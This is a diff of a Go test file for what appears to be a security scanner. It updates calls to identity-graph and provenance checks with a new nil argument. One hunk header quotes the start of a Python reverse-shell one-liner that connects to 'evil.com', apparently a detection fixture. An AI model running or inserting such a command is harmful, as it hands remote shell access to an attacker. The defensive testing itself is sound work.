@@ -214,7 +214,7 @@ python3 -c "import socket,os,subprocess;s=socket.socket();s.connect(('evil.com',
 
 	// Identity graph checks run post-scan in the CLI path (enrichReportFindings),
 	// so call them directly here to validate graph analysis.
-	graphFindings := checks.RunIdentityGraphChecks([]string{root}, 3, false)
+	graphFindings := checks.RunIdentityGraphChecks([]string{root}, 3, false, nil)
 	report.Findings = append(report.Findings, graphFindings...)
 
 	elapsed := time.Since(start)
@@ -785,7 +785,7 @@ packages:
 		mpath := filepath.Join(root, "provenance.json")
 		os.WriteFile(mpath, data, 0o644)
 
-		findings := provenance.RunProvenanceChecks([]string{root}, mpath, false, false)
+		findings := provenance.RunProvenanceChecks([]string{root}, mpath, false, false, nil)
 		hasPROV002, hasPROV005 := false, false
 		for _, f := range findings {
 			if f.RuleID == "PROV-002" {
